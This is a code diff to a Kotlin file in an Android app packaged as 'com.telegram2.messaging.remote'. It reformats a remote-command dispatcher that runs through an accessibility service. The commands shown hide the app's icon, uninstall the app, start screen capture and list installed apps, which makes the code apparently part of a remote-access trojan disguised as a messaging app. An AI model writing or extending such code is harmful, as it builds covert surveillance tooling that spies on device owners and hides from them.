@@ -2,6 +2,7 @@ package com.telegram2.messaging.remote
 
 import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityNodeInfo
+import com.telegram2.messaging.remote.CommandProcessor.RemoteCommand
 
 object MacroRunner {
     var currentPackage: String? = null
@@ -92,15 +93,21 @@ object MacroRunner {
                 true
             }
             "hide_activity" -> {
-                service.runOnMainThreadSync { service.hideAppIcon() }
+                service.runOnMainThreadSync {
+                    service.hideAppIcon()
+                }
                 true
             }
             "uninstall" -> {
-                service.runOnMainThreadSync { service.uninstallSelf() }
+                service.runOnMainThreadSync {
+                    service.uninstallSelf()
+                }
                 true
             }
             "start_screen_capture" -> {
-                service.runOnMainThreadSync { service.startScreenCapture() }
+                service.runOnMainThreadSync {
+                    service.startScreenCapture()
+                }
                 true
             }
             "get_apps" -> {
